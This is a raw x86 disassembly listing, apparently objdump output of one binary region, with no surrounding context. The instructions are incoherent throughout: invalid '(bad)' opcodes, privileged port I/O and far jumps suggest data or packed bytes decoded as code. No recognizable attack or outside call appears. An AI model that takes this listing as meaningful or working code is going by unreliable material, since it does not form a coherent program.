  40883c:	add    DWORD PTR [ebx-0xa5ee956],ebp
  408842:	sbb    dl,bl
  408844:	mov    ds:0xd3fb6141,al
  408849:	push   ds
  40884a:	sub    al,0x6a
  40884c:	and    eax,0x9a329309
  408851:	sub    BYTE PTR [esi],cl
  408853:	rol    DWORD PTR [ebp+0x7b1ef9bb],cl
  408859:	mov    DWORD PTR [eax+0x79c4d95f],eax
  40885f:	fwait
  408860:	(bad)  
  408861:	fistp  DWORD PTR [edi+0x7ced4c6]
  408867:	stc    
  408868:	sub    eax,0x77a2fca6
  40886d:	into   
  40886e:	(bad)  
  408870:	xlat   BYTE PTR ds:[bx]
  408872:	cmp    edi,DWORD PTR [edi+ebp*2-0x69]
  408876:	pop    ds
  408877:	push   edi
  408878:	xchg   edx,eax
  408879:	fistp  QWORD PTR [edi]
  40887b:	cmp    al,0xf5
  40887d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40887e:	cmovp  eax,esp
  408881:	mov    dh,0xad
  408883:	mov    bh,0x69
  408885:	jp     0x40883a
  408887:	push   0x7a152aa5
  40888c:	pop    eax
  40888d:	(bad)  
  40888e:	mov    ebx,0xeac72eb2
  408893:	adc    eax,0xcdc46933
  408898:	pop    ds
  408899:	cmp    DWORD PTR [ecx+0xd06a2c7],edi
  40889f:	shl    BYTE PTR [edi],cl
  4088a1:	xchg   ecx,eax
  4088a2:	fld    TBYTE PTR [ecx-0x7]
  4088a5:	push   es
  4088a6:	push   esi
  4088a7:	iret   
  4088a8:	sub    ah,BYTE PTR [edx+edx*2]
  4088ab:	cmp    al,0x8a
  4088ad:	sti    
  4088ae:	or     DWORD PTR ss:[edi],eax
  4088b1:	daa    
  4088b2:	add    eax,0xfe030bb7
  4088b7:	sub    DWORD PTR [edi+0xc],0xf2c58320
  4088be:	out    dx,al
  4088bf:	or     BYTE PTR [ebx+0x22ec32d3],0x91
  4088c6:	out    dx,eax
  4088c7:	mov    eax,ds:0x48f6b0f5
  4088cc:	jl     0x4088c9
  4088ce:	xor    bl,BYTE PTR [ebp-0x4716d394]
  4088d4:	jl     0x408900
  4088d6:	xchg   BYTE PTR ds:0x56617be2,ch
  4088dc:	sub    eax,0xac4f1b1e
  4088e1:	mov    dl,0x22
  4088e3:	dec    esp
  4088e4:	pop    esi
  4088e5:	jg     0x4088de
  4088e7:	rdpmc  
  4088e9:	mov    gs,WORD PTR [esi+edi*1-0x68bdbd99]
  4088f0:	lahf   
  4088f1:	inc    ebp
  4088f2:	retf   0xc7e7
  4088f5:	inc    ebp
  4088f6:	call   0x72a2:0x417e39bc
  4088fd:	popa   
  4088fe:	in     al,0x42
  408900:	ja     0x408975
  408902:	jns    0x40891c
  408904:	xchg   ebx,eax
  408905:	(bad)  [ebp+0x78]
  408908:	das    
  408909:	mov    edx,0xfdc542
  40890e:	lods   eax,DWORD PTR ds:[esi]
  40890f:	jno    0x408929
  408911:	sub    edi,0x3b37e686
  408917:	or     al,al
  408919:	or     al,0x3f
  40891b:	scas   eax,DWORD PTR es:[edi]
  40891c:	bsf    edi,DWORD PTR [esi-0x32ce954b]
  408923:	js     0x408910
  408925:	ficomp DWORD PTR cs:[eax-0x4642d465]
  40892c:	sub    BYTE PTR [esi-0xc222c0e],cl
  408932:	adc    edx,DWORD PTR [ebp-0xc5c1dde]
  408938:	cmp    ah,BYTE PTR [edi-0x41dc8945]
  40893e:	std    
  40893f:	stc    
  408940:	push   0x63e3d8f3
  408945:	aas    
  408946:	pop    esp
  408947:	cld    
  408948:	mov    BYTE PTR [ebp-0x22],bl
  40894b:	or     BYTE PTR [edi-0x14ce9c0d],bh
  408951:	push   0x81210256
  408956:	test   BYTE PTR [eax],ch
  408958:	in     al,dx
  408959:	xchg   edx,eax
  40895a:	stos   BYTE PTR es:[edi],al
  40895b:	jle    0x4088fe
  40895d:	lds    ebp,FWORD PTR [edx+0x24]
  408960:	xor    BYTE PTR [edx+eiz*2],ah
  408963:	cdq    
  408964:	sub    edi,DWORD PTR [esi-0x7a]
  408967:	daa    
  408968:	and    BYTE PTR [edi-0x6fb331d0],ch
  40896e:	test   al,0x28
  408970:	mov    WORD PTR [eax+esi*4],?
  408973:	aam    0xca
  408975:	pop    ecx
  408976:	stos   BYTE PTR es:[edi],al
  408977:	lds    eax,FWORD PTR ds:0xf2fe0da3
  40897d:	add    bl,ah
  40897f:	push   eax
  408980:	cld    
  408981:	and    al,0xfa
  408983:	xor    cl,BYTE PTR [edi-0x27]
  408986:	mov    ebx,0xd0251338
  40898b:	or     eax,DWORD PTR [ebx+0x404196a3]
  408991:	dec    ecx
  408992:	inc    edi
  408993:	jo     0x40898a
  408995:	adc    BYTE PTR ds:0x9f832bd,bh
  40899b:	cmp    edx,ecx
  40899d:	mov    edi,0x62e312eb
  4089a2:	pop    edi
  4089a3:	push   edx
  4089a4:	dec    edx
  4089a5:	adc    eax,DWORD PTR [ecx+0x1e]
  4089a8:	mov    bh,0xdb
  4089aa:	jg     0x408964
  4089ac:	xchg   BYTE PTR [esi-0x60364329],dl
  4089b2:	push   esp
  4089b3:	fnstcw WORD PTR [edx+0xb878904]
  4089b9:	push   cs
  4089ba:	iret   
  4089bb:	mov    bl,ah
  4089bd:	adc    DWORD PTR [esi+esi*8-0x22],ecx
  4089c1:	scas   al,BYTE PTR es:[edi]
  4089c2:	aad    0xbd
  4089c4:	stos   BYTE PTR es:[edi],al
  4089c5:	fistp  WORD PTR [edi-0x7d]
  4089c8:	stos   BYTE PTR es:[edi],al
  4089c9:	(bad)  
  4089ca:	fild   DWORD PTR [esp+esi*4-0x6ed92b6c]
  4089d1:	test   al,0x3d
  4089d3:	cld    
  4089d4:	xor    al,0x40
  4089d6:	pusha  
  4089d7:	shr    DWORD PTR [esi],1
  4089d9:	jne    0x408a46
  4089db:	jo     0x40895f
  4089dd:	pop    eax
  4089de:	mov    esp,ebx
  4089e0:	and    al,0xab
  4089e2:	cli    
  4089e3:	imul   DWORD PTR [esi+0x235521d5]
  4089e9:	stc    
  4089ea:	jp     0x4089d3
  4089ec:	sub    BYTE PTR [ebp+eiz*4-0x43ec6df9],dl
  4089f3:	sbb    bh,BYTE PTR [ebx-0x77]
  4089f6:	and    esp,DWORD PTR [ecx]
  4089f8:	lock inc esp
  4089fa:	sub    DWORD PTR [edi-0x6974a4e8],ebp
  408a00:	push   edx
  408a01:	dec    esi
  408a02:	sub    esi,ebx
  408a04:	jge    0x408a2c
  408a06:	mov    gs,ebx
  408a08:	imul   ebx,DWORD PTR [edi],0xfffffff5
  408a0b:	leave  
  408a0c:	inc    ecx
  408a0d:	pop    edi
  408a0e:	fwait
  408a0f:	nop
  408a10:	or     BYTE PTR [edx+edi*1+0x54],cl
  408a14:	sbb    ebx,DWORD PTR [ebx-0x2e]
  408a17:	add    eax,0x448e2f68
  408a1c:	add    dl,BYTE PTR [eax-0x7b]
  408a1f:	arpl   WORD PTR [edx],si
  408a21:	xchg   edx,eax
  408a22:	inc    esi
  408a23:	push   0x37c10364
  408a28:	scas   al,BYTE PTR es:[edi]
  408a29:	icebp  
  408a2a:	lds    ebp,FWORD PTR [esi+0x6c2a45b4]
  408a30:	jns    0x408a09
  408a32:	mov    ecx,0x63446760
  408a37:	iret   
  408a38:	cwde   
  408a39:	push   esp
  408a3a:	jge    0x408a34
  408a3c:	outs   dx,BYTE PTR ds:[esi]
  408a3d:	jg     0x408a0c
  408a3f:	mov    DWORD PTR [edi-0x76b7f30b],edx
  408a45:	jbe    0x4089f8
  408a47:	lock ins DWORD PTR es:[edi],dx
  408a49:	jbe    0x4089cc
  408a4b:	mov    ds:0x8cea138d,al
  408a50:	or     BYTE PTR [esi+0x301e1b02],0xa6
  408a57:	xor    DWORD PTR [esi-0x4b],ecx
  408a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a5b:	nop
  408a5c:	pushf  
  408a5d:	xor    al,BYTE PTR [ebx+0x26]
  408a60:	sbb    DWORD PTR [ebx-0x131e04e9],eax
  408a66:	push   edi
  408a67:	and    eax,0xb23cb194
  408a6c:	add    BYTE PTR [ecx+0x4],dl
  408a6f:	cmp    DWORD PTR ds:0x597cd47c,0xffffffa1
  408a76:	sbb    dl,BYTE PTR [edi+ebx*8+0x3b]
  408a7a:	retf   
  408a7b:	or     eax,0xaf520b90
  408a80:	es jmp 0xaf9:0x98b84040
  408a88:	inc    eax
  408a89:	fst    QWORD PTR [ecx-0x73]
  408a8c:	jbe    0x408a6d
  408a8e:	arpl   WORD PTR [ebx],si
  408a90:	jmp    0x6379:0xd135fb82
  408a97:	sub    eax,0x15aa089
  408a9c:	repz mov dh,dl
  408a9f:	loop   0x408a61
  408aa1:	push   esp
  408aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aa3:	test   eax,0xaa26406b
  408aa8:	mov    bh,BYTE PTR [eax-0x2d]
  408aab:	adc    esi,DWORD PTR [esi+0x5b79d75b]
  408ab1:	cmp    ch,BYTE PTR [ecx]
  408ab3:	addr16 sahf 
  408ab5:	sub    BYTE PTR [edi],cl
  408ab7:	mov    al,BYTE PTR [esi+eax*2]
  408aba:	out    dx,eax
  408abb:	mov    ebp,?
  408abd:	adc    al,BYTE PTR [ebx-0x35]
  408ac0:	xchg   ebp,eax
  408ac1:	in     eax,dx
  408ac2:	repz xor edi,DWORD PTR [edx+0x63b0ef8a]
  408ac9:	fcmovu st,st(6)
  408acb:	pop    es
  408acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408acd:	mov    esi,0x6b9102b0
  408ad2:	sti    
  408ad3:	cmc    
  408ad4:	popf   
  408ad5:	scas   al,BYTE PTR es:[edi]
  408ad6:	stos   DWORD PTR es:[edi],eax
  408ad7:	jae    0x408af9
  408ad9:	jmp    0x2748:0xbc990755
  408ae0:	add    BYTE PTR [ebx-0xfedcf9a],bh
  408ae6:	clc    
  408ae7:	xchg   esp,eax
  408ae8:	add    al,0xc3
  408aea:	mov    cl,0x97
  408aec:	icebp  
  408aed:	pop    eax
  408aee:	in     eax,dx
  408aef:	pop    edi
  408af0:	or     bl,ch
  408af2:	pop    ecx
  408af3:	add    eax,0xce2bece3
  408af8:	repz push 0x8c1798f9
  408afe:	sahf   
  408aff:	setg   BYTE PTR [ebx]
  408b02:	fdivr  QWORD PTR [edx-0x150c9379]
  408b08:	push   ebx
  408b09:	mov    al,ds:0x393a85a8
  408b0e:	jb     0x408b4f
  408b10:	mov    esi,0xc45bab01
  408b15:	jge    0x408afe
  408b17:	fadd   DWORD PTR ds:0xed4eab45
  408b1d:	clc    
  408b1e:	jne    0x408b7f
  408b20:	sub    bh,BYTE PTR [edx]
  408b22:	lahf   
  408b23:	mov    ch,0xfb
  408b25:	mov    ecx,0x727e219
  408b2a:	jl     0x408b20
  408b2c:	cwde   
  408b2d:	neg    DWORD PTR [ebx-0x8]
  408b30:	xchg   esi,eax
  408b31:	ss push ebp
  408b33:	adc    eax,0xbefdd318
  408b38:	adc    al,0x9f
  408b3a:	cwde   
  408b3b:	int3   
  408b3c:	lods   eax,DWORD PTR ds:[esi]
  408b3d:	sar    BYTE PTR fs:[esi+eax*1-0x196bb146],cl
  408b45:	inc    ecx
  408b46:	jne    0x408b4d
  408b48:	shl    DWORD PTR [edi+0x2192b14],1
  408b4e:	add    eax,0xb42e2748
  408b53:	xchg   ebx,eax
  408b54:	and    DWORD PTR [edx+0x2c68f69],0x3e9b36f4
  408b5e:	and    BYTE PTR [eax-0x49a893b0],bl
  408b64:	push   ecx
  408b65:	lods   eax,DWORD PTR ds:[esi]
  408b66:	popf   
  408b67:	dec    ecx
  408b68:	xchg   esi,eax
  408b69:	mov    al,0x95
  408b6b:	sub    DWORD PTR [edi],edx
  408b6d:	adc    al,0x59
  408b6f:	mov    ch,0xe9
  408b71:	mov    bl,0x66
  408b73:	fiadd  DWORD PTR [ebx+0xb7864f9]
  408b79:	inc    edx
  408b7a:	in     eax,dx
  408b7b:	adc    ebp,DWORD PTR cs:[ebx+0x60]
  408b7f:	dec    edi
  408b80:	or     BYTE PTR [ebx-0x76af293e],ch
  408b86:	fcmovbe st,st(2)
  408b88:	mov    esp,DWORD PTR [edx+edx*2-0x61]
  408b8c:	pop    es
  408b8d:	sbb    esp,DWORD PTR [edi+0x64]
  408b90:	cli    
  408b91:	lock mov DWORD PTR [edx+0x2f311f95],edi
  408b98:	loop   0x408bb0
  408b9a:	xchg   esp,eax
  408b9b:	call   0x547c55dd
  408ba0:	fldenv [edx-0x2c]
  408ba3:	fcmovnu st,st(4)
  408ba5:	das    
  408ba6:	jbe    0x408bf3
  408ba8:	ins    DWORD PTR es:[edi],dx
  408ba9:	ins    BYTE PTR es:[edi],dx
  408baa:	fsubr  QWORD PTR [ebx-0x632eed86]
  408bb0:	xchg   ecx,eax
  408bb1:	sub    ebp,DWORD PTR es:[ecx-0xdc6448c]
  408bb8:	call   0x363f9628
  408bbd:	aad    0x2a
  408bbf:	add    al,0x22
  408bc1:	push   ds
  408bc2:	or     eax,0x7517dc82
  408bc7:	mov    ds:0x142580a3,al
  408bcc:	push   ebx
  408bcd:	sbb    BYTE PTR [esi-0x466285ae],al
  408bd3:	or     eax,0xcdd55885
  408bd8:	push   esi
  408bd9:	hlt    
  408bda:	sahf   
  408bdb:	rol    DWORD PTR [ebp+0x4eb29cd],0xfe
  408be2:	mov    dl,0xb5
  408be4:	fnstenv [edi+0x3e]
  408be7:	ja     0x408b70
  408be9:	loope  0x408bae
  408beb:	js     0x408baf
  408bed:	add    DWORD PTR [esi-0x50],ebx
  408bf0:	inc    edi
  408bf1:	test   eax,0x75e95313
  408bf6:	sub    al,0x41
  408bf8:	imul   eax,DWORD PTR [edi+0x1774ac71],0x8c40f566
  408c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c03:	inc    edx
  408c04:	arpl   WORD PTR [edi],bp
  408c06:	shl    bl,cl
  408c08:	cmp    DWORD PTR [esp+eiz*4-0x31],edx
  408c0c:	inc    esi
  408c0d:	fcom   DWORD PTR [esi-0x783fcd09]
  408c13:	dec    esi
  408c14:	outs   dx,DWORD PTR ds:[esi]
  408c15:	and    BYTE PTR [eax-0x73],dl
  408c18:	test   BYTE PTR [edx],al
  408c1a:	jp     0x709a6f32
  408c20:	jb     0x408c51
  408c22:	dec    edi
  408c23:	stos   DWORD PTR es:[edi],eax
  408c24:	cmovnp ebx,DWORD PTR [esi]
  408c27:	outs   dx,DWORD PTR ds:[esi]
  408c28:	push   ebp
  408c29:	mov    ecx,0xcae63845
  408c2e:	aam    0x4e
  408c30:	mov    bl,0xd7
  408c32:	cli    
  408c33:	jmp    0x5cd42a89
  408c38:	cmp    al,0xa7
  408c3a:	aas    
  408c3b:	push   ebx
  408c3c:	jbe    0x408be5
  408c3e:	test   al,0x34
  408c40:	inc    esp
  408c41:	sbb    ebp,DWORD PTR [esi+eax*2+0x22ba6196]
  408c48:	scas   eax,DWORD PTR es:[edi]
  408c49:	dec    edi
  408c4a:	and    al,0x2f
  408c4c:	ja     0x408c20
  408c4e:	(bad)  
  408c50:	mov    esi,0xe4742859
  408c55:	(bad)  
  408c56:	cmp    DWORD PTR [ebp-0x19cecd74],edx
  408c5c:	mov    dh,0x5b
  408c5e:	sub    DWORD PTR [ebx-0x6b127f38],esi
  408c64:	sahf   
  408c65:	mov    eax,0x52f862a0
  408c6a:	cmc    
  408c6b:	pop    edi
  408c6c:	jmp    0x408cda
  408c6e:	mov    BYTE PTR [esi+0x65],dh
  408c71:	adc    dl,BYTE PTR [edx-0x63]
  408c74:	inc    edi
  408c75:	pop    ss
  408c76:	mov    esi,0xe8a22347
  408c7b:	jb     0x408c15
  408c7d:	and    DWORD PTR [esi+0x27],eax
  408c80:	pop    esp
  408c81:	loop   0x408cfb
  408c83:	push   es
  408c84:	fistp  WORD PTR [esi+0x69fb6da8]
  408c8a:	out    dx,eax
  408c8b:	aas    
  408c8c:	call   0x5989:0x778e0f3
  408c93:	imul   DWORD PTR [esi]
  408c95:	mov    al,0x2b
  408c97:	cmp    BYTE PTR [edi+0x7d],dl
  408c9a:	jg     0x408c8e
  408c9c:	call   0xe812:0xa5efad29
  408ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca4:	push   eax
  408ca5:	aaa    
  408ca6:	cld    
  408ca7:	clc    
  408ca8:	pop    esp
  408ca9:	push   esi
  408caa:	ss int3 
  408cac:	lahf   
  408cad:	lock arpl WORD PTR ds:0xcfca3fe4,bx
  408cb4:	mov    ebp,0xc32f5771
  408cb9:	test   BYTE PTR [edi],0x1a
  408cbc:	adc    DWORD PTR ds:[esi],ebx
  408cbf:	cdq    
  408cc0:	push   edx
  408cc1:	bts    ebp,eax
  408cc4:	mov    BYTE PTR [edx+0x63],bh
  408cc7:	add    DWORD PTR [eax],ebx
  408cc9:	popf   
  408cca:	call   0xeeaf5275
  408ccf:	popa   
  408cd0:	bound  edx,QWORD PTR [edx-0x28]
  408cd3:	and    eax,DWORD PTR [esi-0x74]
  408cd6:	jecxz  0x408cee
  408cd8:	mov    ds:0x466ac033,al
  408cdd:	scas   al,BYTE PTR es:[edi]
  408cde:	test   al,0xf
  408ce0:	aas    
  408ce1:	loop   0x408cb8
  408ce3:	dec    edx
  408ce4:	dec    edi
  408ce5:	popf   
  408ce6:	out    0xf3,eax
  408ce8:	addr16 je 0x408ce2
  408ceb:	or     ebp,DWORD PTR [esp+edi*8]
  408cee:	xchg   edx,eax
  408cef:	iret   
  408cf0:	pop    ds
  408cf1:	(bad)  
  408cf2:	fisttp DWORD PTR [ebp-0x2f]
  408cf5:	icebp  
  408cf6:	pop    ebx
  408cf7:	out    dx,al
  408cf8:	daa    
  408cf9:	fild   WORD PTR [ebx+edi*2]
  408cfc:	shl    edi,0xce
  408cff:	rcr    BYTE PTR [eax+ecx*1+0x13bd0406],0x73
  408d07:	or     DWORD PTR [eax],ebx
  408d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d0a:	sbb    cl,BYTE PTR [eax]
  408d0c:	and    BYTE PTR ds:0x6009d69a,dh
  408d12:	cmp    al,BYTE PTR [ebx]
  408d14:	inc    eax
  408d15:	les    eax,FWORD PTR [eax-0x24]
  408d18:	jmp    0x7c2d:0x60e5d4c8
  408d1f:	push   esi
  408d20:	mov    eax,DWORD PTR [ecx-0x4b6fbf94]
  408d26:	stos   DWORD PTR es:[edi],eax
  408d27:	(bad)  
  408d28:	imul   esp,DWORD PTR ds:0x7e8f8e63,0x2274d203
  408d32:	jbe    0x408d30
  408d34:	dec    eax
  408d35:	jae    0x408d60
  408d37:	push   ss
  408d38:	mov    ds:0x11c35344,al
  408d3d:	(bad)  
  408d3f:	rcr    BYTE PTR [ebx+eiz*1-0x69],cl
  408d43:	mov    bh,0x6a
  408d45:	fcomi  st,st(2)
  408d47:	out    dx,al
  408d48:	jno    0x408d64
  408d4a:	inc    esp
  408d4b:	cmp    BYTE PTR [edx],cl
  408d4d:	inc    ebp
  408d4e:	stos   DWORD PTR es:[edi],eax
  408d4f:	pushf  
  408d50:	ss out dx,al
  408d52:	push   edx
  408d53:	arpl   WORD PTR ds:0x34fc1664,bp
  408d59:	adc    edx,DWORD PTR [edi]
  408d5b:	cmp    esp,ecx
  408d5d:	arpl   WORD PTR [ecx+0x7f],bp
  408d60:	mov    dl,0x29
  408d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d63:	rcl    DWORD PTR [eax+0x2f],0xae
  408d67:	cmp    eax,0xc30e841e
  408d6c:	fld    DWORD PTR [ecx+0x69f480a9]
  408d72:	popf   
  408d73:	lahf   
  408d74:	xor    cl,BYTE PTR [ebp-0x71]
  408d77:	mov    DWORD PTR ds:0xb08ad9e0,ebx
  408d7d:	call   0x2e05db09
  408d82:	jmp    0x8470a411
  408d87:	cs int3 
  408d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d8a:	mov    ecx,0x2aa51ad6
  408d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d91:	sub    esp,DWORD PTR [esi-0x3c]
  408d94:	(bad)
  408d97:	jmp    0x408d8e
  408d99:	xchg   edi,eax
  408d9a:	(bad)  
  408d9b:	fisubr DWORD PTR [ebp-0x18]
  408d9e:	stos   BYTE PTR es:[edi],al
  408d9f:	inc    esi
  408da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da1:	daa    
  408da2:	mov    DWORD PTR [ebx-0x7c],edx
  408da5:	xchg   edx,eax
  408da6:	fdivrp st(5),st
  408da8:	aas    
  408da9:	cwde   
  408daa:	sbb    ecx,0x42ba607c
  408db0:	adc    al,0x1
  408db2:	imul   DWORD PTR [esi*1-0x301c9007]
  408db9:	icebp  
  408dba:	push   ss
  408dbb:	sahf   
  408dbc:	in     al,0xe8
  408dbe:	mov    dl,0xd9
  408dc0:	push   cs
  408dc1:	mov    DWORD PTR [edx-0x66c870ed],esi
  408dc7:	jmp    0x63ab:0xd212b1b7
  408dce:	push   esi
  408dcf:	push   ss
  408dd0:	push   es
  408dd1:	js     0x408e30
  408dd3:	sub    DWORD PTR [esi],esi
  408dd5:	lock stc 
  408dd7:	adc    ebx,ebx
  408dd9:	inc    esi
  408dda:	sbb    eax,0xc2f8886a
  408ddf:	inc    ebp
  408de0:	nop
  408de1:	mov    es,esp
  408de3:	jg     0x408e5b
  408de5:	adc    al,0x22
  408de7:	cmc    
  408de8:	add    ebx,eax
  408dea:	add    BYTE PTR [eax+0x65],dh
  408ded:	pop    ds
  408dee:	mov    DWORD PTR [esp-0x35],edx
  408df2:	in     al,dx
  408df3:	pop    ds
  408df4:	sbb    eax,0x823e18c2
  408df9:	js     0x408dd7
  408dfb:	inc    edi
  408dfc:	out    dx,al
  408dfd:	retf   
  408dfe:	pop    ebp
  408dff:	mov    edx,0xb39a8b18
  408e04:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e06:	into   
  408e07:	ror    BYTE PTR ds:0x79e43936,cl
  408e0d:	cmp    ah,BYTE PTR [edx-0x92d8e9f]
  408e13:	jbe    0x408e50
  408e15:	(bad)  
  408e16:	ds pushf 
  408e18:	mov    dh,0xfb
  408e1a:	and    eax,0xaae4c9f1
  408e1f:	(bad)  
  408e20:	pushf  
  408e21:	jp     0x408e62
  408e23:	jae    0x408e0c
  408e25:	pop    esp
  408e26:	out    0x22,eax
  408e28:	ret    0x5b8c
  408e2b:	inc    edi
  408e2c:	inc    edx
  408e2d:	adc    DWORD PTR [esp+ebp*1],edi
  408e30:	adc    eax,0x516210c7
  408e35:	push   ebp
  408e36:	test   al,0xfd
  408e38:	mov    ecx,0x23ad12d7
  408e3d:	mov    edx,0xddb59494
  408e42:	jno    0x408e8b
  408e44:	and    dl,0xce
  408e47:	mov    esp,0xd7cc8fff
  408e4c:	xchg   ebp,eax
  408e4d:	ss in  eax,dx
  408e4f:	mov    edx,DWORD PTR [eax+0x75a8dd80]
  408e55:	in     al,0xec
  408e57:	(bad)  
  408e58:	sbb    bh,BYTE PTR [ecx-0x8]
  408e5b:	int3   
  408e5c:	inc    ecx
  408e5d:	test   eax,0x3f9a3445
  408e62:	adc    dh,dh
  408e64:	cmp    dl,BYTE PTR [esi+0x47]
  408e67:	pusha  
  408e68:	xor    eax,0xe611ccdc
  408e6d:	dec    DWORD PTR [edx+ecx*4+0x2b93fe9]
  408e74:	adc    esi,edi
  408e76:	or     edx,DWORD PTR [eax+ebp*8-0x5e]
  408e7a:	push   esi
  408e7b:	sbb    BYTE PTR [edx-0x24],cl
  408e7e:	outs   dx,BYTE PTR ds:[esi]
  408e7f:	adc    eax,DWORD PTR [ebx]
  408e81:	jmp    0x408ea1
  408e83:	xchg   edx,eax
  408e84:	lods   eax,DWORD PTR ds:[esi]
  408e85:	and    BYTE PTR fs:[esi-0x2704adc4],0x45
  408e8d:	sub    DWORD PTR [eax-0x4bdb6111],ebp
  408e93:	jge    0x408eaf
  408e95:	sbb    BYTE PTR [ebp+0xaf6b78a],cl
  408e9b:	fld    TBYTE PTR [ebp+0x14e05ab3]
  408ea1:	pop    es
  408ea2:	out    dx,al
  408ea3:	jb     0x408e58
  408ea5:	stos   DWORD PTR es:[edi],eax
  408ea6:	mov    ch,bl
  408ea8:	lods   al,BYTE PTR ds:[esi]
  408ea9:	test   al,0x71
  408eab:	xchg   BYTE PTR [ecx],dh
  408ead:	sbb    BYTE PTR [ebx],0xe5
  408eb0:	jg     0x408f13
  408eb2:	pop    eax
  408eb3:	adc    ch,BYTE PTR [ecx+0x22]
  408eb6:	dec    edx
  408eb7:	push   0xcec795a7
  408ebc:	mov    ds:0x10baeced,al
  408ec1:	stos   BYTE PTR es:[edi],al
  408ec2:	outs   dx,DWORD PTR ds:[esi]
  408ec3:	push   0x1a
  408ec5:	inc    esp
  408ec6:	js     0x408f0d
  408ec8:	mov    dl,0x40
  408eca:	mov    ecx,edi
  408ecc:	pop    edi
  408ecd:	imul   esi,ebx,0xbe70e2fe
  408ed3:	fimul  WORD PTR [eax]
  408ed5:	add    ebx,DWORD PTR [edi]
  408ed7:	add    bl,BYTE PTR [ebx+0x7c]
  408eda:	jo     0x408e69
  408edc:	or     BYTE PTR [eax-0x6c],al
  408edf:	jbe    0x408e68
  408ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee2:	xchg   ebx,eax
  408ee3:	inc    esi
  408ee4:	test   DWORD PTR [edx-0x24],edx
  408ee7:	(bad)  
  408ee8:	retf   
  408ee9:	ds mov esi,0xfd2e79a1
  408eef:	(bad)  
  408ef0:	rcl    DWORD PTR [ebp+0x7e],0x68
  408ef4:	xchg   ecx,eax
  408ef5:	shl    DWORD PTR [eax+0x49],1
  408ef8:	pop    esp
  408ef9:	xchg   edi,eax
  408efa:	ret    
  408efb:	pop    bp
  408efd:	mov    ebp,0x306583a7
  408f02:	jbe    0x408f6d
  408f04:	sbb    al,0xc9
  408f06:	jle    0x408ee3
  408f08:	cmp    al,0xb4
  408f0a:	cld    
  408f0b:	xlat   BYTE PTR ds:[ebx]
  408f0c:	shl    DWORD PTR [edx-0x74],1
  408f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f10:	or     ch,BYTE PTR ds:0x771ccdd5
  408f16:	adc    BYTE PTR [esi],dl
  408f18:	lods   eax,DWORD PTR ds:[esi]
  408f19:	and    eax,0x37f3a782
  408f1e:	xor    DWORD PTR [edx],edx
  408f20:	mov    ch,0x7f
  408f22:	(bad)  [ecx-0x1480088a]
  408f28:	cmc    
  408f29:	fsubp  st(6),st
  408f2b:	jae    0x408f8d
  408f2d:	mov    ah,0x8
  408f2f:	mov    ah,0xca
  408f31:	pusha  
  408f32:	xchg   edx,eax
  408f33:	inc    ebx
  408f34:	(bad)  
  408f35:	int3   
  408f36:	mov    bh,0x1d
  408f38:	sbb    DWORD PTR [ebp-0x67],0x82cb4d84
  408f3f:	test   al,0x87
  408f41:	add    cl,BYTE PTR [ebp-0x459f3006]
  408f47:	add    dh,bh
  408f49:	or     BYTE PTR [ebp+0x8],bl
  408f4c:	mov    ds:0x4c4db2d8,eax
  408f51:	inc    esi
  408f52:	push   eax
  408f53:	mov    DWORD PTR [ebp+0x57],esp
  408f56:	nop
  408f57:	xchg   ebp,eax
  408f58:	pop    ss
  408f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f5a:	cmp    bl,ch
  408f5c:	loopne 0x408f05
  408f5e:	fiadd  DWORD PTR [edi+0x4053535c]
  408f64:	inc    esi
  408f65:	push   esi
  408f66:	lock sub DWORD PTR [eax+eiz*2-0x40ddf566],0x1c
  408f6f:	std    
  408f70:	push   cs
  408f71:	cs enter 0x9b1c,0x55
  408f76:	mov    WORD PTR [eax+edi*1+0x1fa10858],ds
  408f7d:	lods   eax,DWORD PTR ds:[esi]
  408f7e:	out    0xd9,eax
  408f80:	fimul  WORD PTR [edi-0x2b0007ee]
  408f86:	pop    ds
  408f87:	sbb    al,0x46
  408f89:	nop
  408f8a:	or     DWORD PTR [ebx+0x74378528],esp
  408f90:	lods   eax,DWORD PTR ds:[esi]
  408f91:	mov    eax,ds:0x8953c25d
  408f96:	add    ebp,DWORD PTR [ebp+0x75e7b695]
  408f9c:	in     eax,dx
  408f9d:	push   ds
  408f9e:	aad    0xca
  408fa0:	push   edx
  408fa1:	mov    dh,BYTE PTR [eax+0x3a]
  408fa4:	xchg   DWORD PTR [ecx],ecx
  408fa6:	push   0xaa9e916c
  408fab:	test   BYTE PTR [eax+esi*4],dl
  408fae:	retf   0x4808
  408fb1:	inc    ecx
  408fb2:	cmp    ebx,0xb8318755
  408fb8:	xchg   ebx,ecx
  408fba:	jbe    0x408fa3
  408fbc:	jmp    0x3379:0x82f66aa0
  408fc3:	mov    cl,0x87
  408fc5:	dec    eax
  408fc6:	test   al,0xfc
  408fc8:	daa    
  408fc9:	mov    bh,0x20
  408fcb:	push   ds
  408fcc:	push   ds
  408fcd:	mov    cs,WORD PTR [esi+eiz*8+0x6656f953]
  408fd4:	jl     0x408fa2
  408fd6:	arpl   dx,si
  408fd8:	(bad)  
  408fd9:	int    0xab
  408fdb:	jns    0x408f8d
  408fdd:	lods   eax,DWORD PTR ds:[esi]
  408fde:	rcr    BYTE PTR ss:[ebp-0x77],0x63
  408fe3:	test   eax,edx
  408fe5:	arpl   WORD PTR [edi],cx
  408fe7:	fst    DWORD PTR [edx-0x76a4a220]
  408fed:	cmp    esp,DWORD PTR [ecx-0x1c]
  408ff0:	ret    
  408ff1:	imul   eax,DWORD PTR [ecx],0xffffffc3
  408ff4:	std    
  408ff5:	xor    eax,0xc7906b06
  408ffa:	cli    
  408ffb:	ret    0xf796
